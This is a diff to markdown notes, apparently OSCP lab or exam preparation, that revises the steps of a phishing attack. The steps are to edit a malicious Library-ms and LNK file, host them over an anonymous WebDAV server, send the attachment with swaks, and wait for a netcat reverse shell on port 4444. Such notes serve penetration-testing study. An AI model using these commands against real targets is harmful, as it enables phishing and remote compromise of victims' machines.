@@ -120,21 +120,15 @@ Create malicious file:
 
 config.Library-ms and install.LNK file: change the IP address and the download link.
 
-#Running webdav folder
-/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav
-#for newer version of KALI
-wsgidav  --host=0.0.0.0 --port=80 --auth=anonymous --root webdav
+Running webdav folder
 
-#Send mail phishing
-sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.190.189
---body @body. txt --header "Subject: Staging Script" --suppress-data -ap
+```sudo wsgidav  --host=0.0.0.0 --port=80 --auth=anonymous --root webdav```
 
-#wait for nc -lnvp 4444
+Send phishing mail:
 
-3. Priv
-=> get access to 14 - WK01 machine
-![image](https://github.com/chimmeee/OSCP_files/assets/112913821/063811a0-6579-41d1-a972-6a125837f8f2)
+```sudo swaks -t username@domain.com --from maildmz@domain.com --attach @config.Library-ms --server $IP --body @body. txt --header "Subject: Staging Script" --suppress-data -ap```
 
+wait for nc -lnvp 4444
 
 
 
